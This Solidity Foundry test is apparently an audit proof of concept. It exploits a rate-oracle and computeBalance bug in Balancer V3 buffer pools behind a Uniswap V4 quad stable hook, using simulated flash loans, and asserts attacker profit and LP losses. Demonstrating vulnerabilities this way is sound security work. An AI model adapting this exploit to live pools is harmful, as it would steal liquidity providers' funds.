// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IRateProvider} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IRateProvider.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IVault} from "@crane/contracts/external/balancer/v3/interfaces/contracts/vault/IVault.sol";
import {IStandardExchangeBufferPool} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/standardExchange/IStandardExchangeBufferPool.sol";
import {SeMatrix_BufferPoolHarness} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrix_BufferPoolFixture.sol";
import {SeMatrix_BalancerBufferPoolFixtureBase} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrix_BalancerBufferPoolFixtureBase.sol";
import {UniswapV4StandardExchangeCurveQuadStableBufferHook_SeMatrix_StandardExchangeBufferPool as Row} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/stable/quad/curve/UniswapV4StandardExchangeCurveQuadStableBufferHook_SeMatrix_StandardExchangeBufferPool.t.sol";

interface IRouterLike {
    function removeLiquiditySingleTokenExactIn(address pool, uint256 exactBptAmountIn, IERC20 tokenOut, uint256 minAmountOut, bool wethIsEth, bytes memory userData) external payable returns (uint256);
}

/// chain-rate-oracle composite.
/// Fixture: the project's own matrix row "Curve quad stable buffer hook x StandardExchangeBufferPool":
/// 4 buffered legs, each leg's SE is a StandardExchangeBufferPool (Balancer V3, BPT-as-SE) valued by a
/// StandardExchangeRateProvider (RP = pool raw shares / BPT supply). Real V4 PoolManager, real Balancer VaultMock per leg.
///
/// One manipulation per pool: a TTA->shares swap. It (a) sets the pool's hookSharesDelta h, so every
/// SINGLE_TOKEN_EXACT_IN exit to shares pays ~lift(h) (computeBalance domain bug), and (b) moves RP_i
/// (full-book rate provider). Consumers fed by that single push, all in one tx:
///   C1 attacker's own dust BPT single-token exits (computeBalance primitive)
///   C2 the quad hook's exchangeIn(face_j -> face_i): the hook redeems BPT_i single-token -> overpaid by lift(h), forwarded to attacker
///   C3 the quad hook's RP_i (rate consumer): credits/valuation shift with the push (se-rate primitive)
/// Flash capital (TTA_i and face_j) is a simulated loan: principal + 9 bps fee must be held in kind at the end (asserted).
contract ChainRateOracle is Row {
    uint256 constant FLASH_FEE_BPS = 9;
    address atk;
    uint256[4] rate; // pre-attack fair price of face_i (aero SE share) in its TTA_i (DAI) units
    uint256[4] debtTta;
    uint256[4] debtFace;

    function _h(uint256 i) internal view returns (SeMatrix_BufferPoolHarness) {
        return SeMatrix_BufferPoolHarness(address(SeMatrix_BalancerBufferPoolFixtureBase(address(fxs[i])).harness()));
    }
    function _p(uint256 i) internal view returns (IStandardExchangeBufferPool) { return IStandardExchangeBufferPool(fxs[i].se()); }
    function _face(uint256 i) internal view returns (IERC20) { return IERC20(fxs[i].faceToken()); }
    function _tta(uint256 i) internal view returns (IERC20) { return _h(i).tta(); }
    function _rp(uint256 i) internal view returns (uint256) { return IRateProvider(quad.rateProvider(i)).getRate(); }
    function _raw(uint256 i) internal view returns (uint256 sh, uint256 t) {
        IStandardExchangeBufferPool p = _p(i);
        (,, uint256[] memory raw,) = IVault(_h(i).matrixBalancerVault()).getPoolTokenInfo(address(p));
        sh = raw[p.sharesIndex()]; t = raw[p.ttaIndex()];
    }
    function _poolValue(uint256 i) internal view returns (uint256) {
        (uint256 sh, uint256 t) = _raw(i);
        return sh * rate[i] / 1e18 + t;
    }
    function _bptValue(uint256 i, uint256 bpt) internal view returns (uint256) {
        return _poolValue(i) * bpt / IERC20(address(_p(i))).totalSupply();
    }
    function _atkValue() internal view returns (uint256 v) {
        for (uint256 i; i < 4; ++i) {
            v += _tta(i).balanceOf(atk) + _face(i).balanceOf(atk) * rate[i] / 1e18;
        }
    }
    function _debtValue() internal view returns (uint256 v) {
        for (uint256 i; i < 4; ++i) {
            uint256 dt = debtTta[i] + debtTta[i] * FLASH_FEE_BPS / 10_000;
            uint256 df = debtFace[i] + debtFace[i] * FLASH_FEE_BPS / 10_000;
            v += dt + df * rate[i] / 1e18;
        }
    }
    /// quad LP book (hook BPT at proportional value + any face residue) and outside pool LPs (harness alice)
    function _quadBook() internal view returns (uint256 v) {
        for (uint256 i; i < 4; ++i) {
            v += _bptValue(i, IERC20(address(_p(i))).balanceOf(hook)) + _face(i).balanceOf(hook) * rate[i] / 1e18;
        }
    }
    function _aliceBook() internal view returns (uint256 v) {
        for (uint256 i; i < 4; ++i) v += _bptValue(i, IERC20(address(_p(i))).balanceOf(_h(i).getAlice()));
    }

    function _setup() internal {
        _setDexFee(1e15); // 0.1% quad fee
        _joinAll(_f(200), 200); // honest quad LP: 200 face per leg
        atk = _h(0).getBob();
        for (uint256 i; i < 4; ++i) {
            require(_h(i).getBob() == atk, "same bob");
            rate[i] = _h(i).seRateProvider().getRate();
            vm.startPrank(atk);
            // REVIEW: park bob's pre-existing harness balances so flash debts can only be repaid from attack proceeds
            { uint256 b = _tta(i).balanceOf(atk); if (b > 0) _tta(i).transfer(address(0xBEEF), b); }
            { uint256 b = _face(i).balanceOf(atk); if (b > 0) _face(i).transfer(address(0xBEEF), b); }
            _face(i).approve(hook, type(uint256).max);
            IERC20(address(_p(i))).approve(_h(i).matrixBalancerRouter(), type(uint256).max);
            vm.stopPrank();
        }
    }

    function _borrowTta(uint256 i, uint256 a) internal { _h(i).mintTTA(atk, a); debtTta[i] += a; }
    function _borrowFace(uint256 i, uint256 a) internal { fxs[i].fund(atk, a); debtFace[i] += a; }

    function quadSwap(address tin, uint256 amt, address tout) external returns (uint256 out) {
        require(msg.sender == address(this));
        vm.prank(atk);out = IStandardExchangeIn(hook).exchangeIn(IERC20(tin), amt, IERC20(tout), 0, atk, false, block.timestamp + 1);
    }
    function dustExit(uint256 i, uint256 bpt) external returns (uint256 out) {
        require(msg.sender == address(this));
        vm.prank(atk);
        out = IRouterLike(_h(i).matrixBalancerRouter()).removeLiquiditySingleTokenExactIn(address(_p(i)), bpt, _face(i), 1, false, "");
    }

    struct Cfg { uint256 push; uint256 routeQ; uint256 routeN; uint256 dustN; uint256 dustDiv; }

    /// One leg: push once, then feed consumers C2 (quad route) and C1 (dust exits).
    function _leg(uint256 i, Cfg memory c) internal returns (uint256 c1Out, uint256 c2Gain) {
        uint256 j = (i + 1) % 4; // payer leg for the quad route
        // attacker's own tiny BPT_i position (own capital: 1 face_i)
        fxs[i].fund(atk, 1e18);
        uint256 bpt = _h(i).addLiquidityUnbalanced(atk, 0, 1e18);
        uint256 rp0 = _rp(i);
        // THE manipulation
        _borrowTta(i, c.push);
        uint256 got = _h(i).swapTTAforShares(atk, c.push);
        console2.log("leg", i);
        console2.log("  push TTA->shares in/out", c.push, got);
        console2.log("  RP_i rest -> pushed", rp0, _rp(i));
        console2.log("  h:"); console2.logInt(_p(i).hookSharesDelta());
        // C2: quad route face_j -> face_i (hook redeems BPT_i single-token, gets lift(h))
        for (uint256 k; k < c.routeN; ++k) {
            _borrowFace(j, c.routeQ);
            try this.quadSwap(address(_face(j)), c.routeQ, address(_face(i))) returns (uint256 o) {
                console2.log("  C2 quad face_j->face_i in/out", c.routeQ, o);
                c2Gain += o;
            } catch { console2.log("  C2 reverted at", k); break; }
        }
        // C1: dust exits
        uint256 chunk = bpt / c.dustDiv;
        for (uint256 k; k < c.dustN; ++k) {
            try this.dustExit(i, chunk) returns (uint256 o) { c1Out += o; }
            catch { console2.log("  C1 dust exit reverted at", k); break; }
        }
        console2.log("  C1 dust exits total shares", c1Out);
        uint256 rem = IERC20(address(_p(i))).balanceOf(atk);
        if (rem > 0) _h(i).removeLiquidityProportional(atk, rem, 0, 0);
        console2.log("  RP_i after", _rp(i));
        (uint256 sh, uint256 t) = _raw(i);
        console2.log("  pool raw shares / tta after", sh, t);
    }

    function _faceNeed(uint256 idx) internal view returns (uint256) {
        return debtFace[idx] + debtFace[idx] * FLASH_FEE_BPS / 10_000;
    }

    /// Settle flash debts honestly, in kind. (1) Cover each face_idx debt: if short, route a surplus
    /// face token into face_idx through the quad hook. (2) Cover each TTA_i debt by selling face_i -> TTA_i
    /// in pool_i. Then assert the full principal+fee is held in kind and hand it back to the lender.
    function _repay() internal {
        // (1) face debts
        for (uint256 idx; idx < 4; ++idx) {
            uint256 needF = _faceNeed(idx);
            for (uint256 r; r < 8 && _face(idx).balanceOf(atk) < needF; ++r) {
                // pick the surplus face token (most held, != idx) and route it into face_idx
                uint256 best; uint256 bestBal;
                for (uint256 s; s < 4; ++s) {
                    if (s == idx) continue;
                    uint256 b = _face(s).balanceOf(atk);
                    if (b > bestBal) { bestBal = b; best = s; }
                }
                if (bestBal == 0) break;
                uint256 shortF = needF - _face(idx).balanceOf(atk);
                // over-provide input; quad route is lossy, so send a generous slice of the surplus
                uint256 sendIn = shortF * 2 + 1e18;
                if (sendIn > bestBal) sendIn = bestBal;
                try this.quadSwap(address(_face(best)), sendIn, address(_face(idx))) {} catch { break; }
            }
        }
        // (2) TTA debts, plus final in-kind settlement
        for (uint256 i; i < 4; ++i) {
            uint256 need = debtTta[i] + debtTta[i] * FLASH_FEE_BPS / 10_000;
            for (uint256 r; r < 12 && _tta(i).balanceOf(atk) < need; ++r) {
                uint256 short = need - _tta(i).balanceOf(atk);
                uint256 sell = short * 1e18 / rate[i] * 105 / 100 + 1e15;
                uint256 bal = _face(i).balanceOf(atk);
                if (sell > bal) sell = bal;
                { (uint256 shRaw,) = _raw(i); uint256 cap = shRaw / 4; if (sell > cap) sell = cap; } // REVIEW: respect Balancer MaxInRatio
                if (sell == 0) break;
                _h(i).swapSharesForTTA(atk, sell);
            }
            uint256 needF = _faceNeed(i);
            assertGe(_tta(i).balanceOf(atk), need, "TTA flash repaid in kind");
            assertGe(_face(i).balanceOf(atk), needF, "face flash repaid in kind");
            // burn repayment (lender takes it back)
            vm.startPrank(atk);
            if (need > 0) _tta(i).transfer(address(0xdead), need);
            if (needF > 0) _face(i).transfer(address(0xdead), needF);
            vm.stopPrank();
        }
    }

    function _run(uint256 legMask, Cfg memory c) internal returns (int256 profit, int256 quadLoss, int256 aliceLoss) {
        _setup();
        uint256 q0 = _quadBook();
        uint256 a0 = _aliceBook();
        uint256 v0 = _atkValue();
        for (uint256 i; i < 4; ++i) if (legMask & (1 << i) != 0) _leg(i, c);
        _repay();
        uint256 v1 = _atkValue();
        // own capital = 1 face per attacked leg (fund) -> counted as cost
        uint256 own;
        for (uint256 i; i < 4; ++i) if (legMask & (1 << i) != 0) own += rate[i];
        profit = int256(v1) - int256(v0) - int256(own);
        quadLoss = int256(q0) - int256(_quadBook());
        aliceLoss = int256(a0) - int256(_aliceBook());
        console2.log("attacker net profit (fair pre-attack prices, TTA units, after flash fee):"); console2.logInt(profit);
        console2.log("quad LP book loss:"); console2.logInt(quadLoss);
        console2.log("outside pool LPs (alice) loss:"); console2.logInt(aliceLoss);
        for (uint256 i; i < 4; ++i) assertEq(IERC20(address(_p(i))).balanceOf(atk), 0, "no residual BPT");
        // REVIEW: re-value residual holdings at the POST-attack face price too (min of pre/post) and log holdings
        uint256 v1Post;
        for (uint256 i; i < 4; ++i) {
            uint256 rPost = _h(i).seRateProvider().getRate();
            uint256 r = rPost < rate[i] ? rPost : rate[i];
            console2.log("leg face rate pre / post", rate[i], rPost);
            console2.log("  atk residual TTA / face", _tta(i).balanceOf(atk), _face(i).balanceOf(atk));
            v1Post += _tta(i).balanceOf(atk) + _face(i).balanceOf(atk) * r / 1e18;
        }
        int256 profitMin = int256(v1Post) - int256(v0) - int256(own);
        console2.log("attacker net profit at min(pre,post) face price:"); console2.logInt(profitMin);
        assertGt(profitMin, 0, "profit at min(pre,post) price");
    }

    // ---- baselines (single primitive, same fixture) ----
    // Baseline: one leg only (single pool manipulated, quad route = rate+computeBalance consumers).
    // Single leg cannot repay its own TTA push via face netting; funded TTA buffer counted as cost.
    function test_baseline_oneLeg() public {
        (int256 p, int256 ql, int256 al) = _run(1, Cfg({push: 300e18, routeQ: 50e18, routeN: 10, dustN: 0, dustDiv: 20}));
        emit log_named_int("oneLeg profit", p); ql; al;
        // no profit assert: single-leg flash (one DAI market) cannot self-repay; see allLegs for the valid composite
    }
    // Composite: all 4 pools manipulated and consumed in ONE tx; cross-leg face debts net; TTA repaid by
    // selling abundant face_i. C1 dust competes with C2 for the same lift(h) and reverts after it.
    function test_composite_allLegs() public {
        (int256 p,,) = _run(15, Cfg({push: 300e18, routeQ: 50e18, routeN: 10, dustN: 20, dustDiv: 20}));
        assertGt(p, 0);
    }
    // Composite without the (non-stacking) dust leg: same consumers, cleaner.
    function test_composite_allLegs_noDust() public {
        (int256 p,,) = _run(15, Cfg({push: 300e18, routeQ: 50e18, routeN: 10, dustN: 0, dustDiv: 20}));
        assertGt(p, 0);
    }
}
